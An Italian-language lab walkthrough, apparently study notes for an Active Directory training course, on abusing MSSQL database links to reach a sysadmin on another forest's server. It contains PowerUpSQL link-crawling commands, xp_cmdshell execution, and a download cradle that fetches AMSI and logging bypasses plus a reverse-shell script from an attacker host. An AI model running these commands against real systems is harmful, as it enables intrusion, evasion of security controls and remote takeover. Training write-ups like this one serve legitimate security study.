# LEARNING OBJECTIVE22

<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Get a reverse shell on a SQL server in eurocorp forest by abusing\
  database links from dcorp-mssql.

### SVOLGIMENTO

Iniziamo con l'enumerazione dei server SQL nel dominio e verifichiamo se student460 dispone dei privilegi per connettersi a uno di essi. A tal fine, possiamo utilizzare il modulo PowerUpSQL. Esegui il comando riportato di seguito da una sessione PowerShell avviata utilizzando Invisi-Shell:

```powershell
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
```

```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Quindi, possiamo collegarci a dcorp-mssql. Utilizzando il client HeidiSQL, effettuiamo il login a dcorp-mssql utilizzando l'autenticazione Windows di studentx. Dopo il login, elenchiamo i database collegati su dcorp-mssql:

```powershell
select * from master..sysservers
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Quindi, esiste un collegamento al database dcorp-sql1 da dcorp-mssql. Enumerare ulteriori collegamenti da dcorpsql1. Ciò può essere fatto con l'aiuto di openquery:

```powershell
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

È possibile fare nested openquery all'interno di un altro openquery, il che ci porta a dcorp-mgmt:

```powershell
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

È inoltre possibile utilizzare Get-SQLServerLinkCrawl per eseguire automaticamente la scansione dei collegamenti al database:

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Fantastico! Abbiamo un sysadmin (sa) sul server eu-sql!

Se xp\_cmdshell è abilitato (o RPC out è abilitato, che in questo caso è impostato su falso), è possibile eseguire comandi su eu-sql utilizzando database collegati. Per evitare di dover gestire un numero elevato di virgolette e caratteri di escape, possiamo utilizzare il seguente comando:

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

### Creare Invoke-PowerShellTcpEx.ps1:

* Creare una copia di Invoke-PowerShellTcp.ps1 e rinominarla Invoke-PowerShellTcpEx.ps1.
* Aprire Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (fare clic con il pulsante destro del mouse e selezionare Modifica).
* Aggiungere “Power -Reverse -IPAddress 172.16.100.X -Port 443” (senza virgolette) alla fine del file.

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

* Proviamo a eseguire un download di PowerShell execute cradle per eseguire una shell revshell PowerShell sull'istanza eu-sql.
* Ricordarsi di avviare un listener:

<figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

A questo punto eseguiamo il seguente comando che esegue in memoria sbloggin amsibypass e poi Invoke-PowershellTcpEx&#x20;

```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.60/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.60/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.60/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql30
```

<figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Se bene ci sia un errore nell'output del campo Custom QUery, tornando al listener possiamo vedere l'avvenuta connessione via revshell

<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>
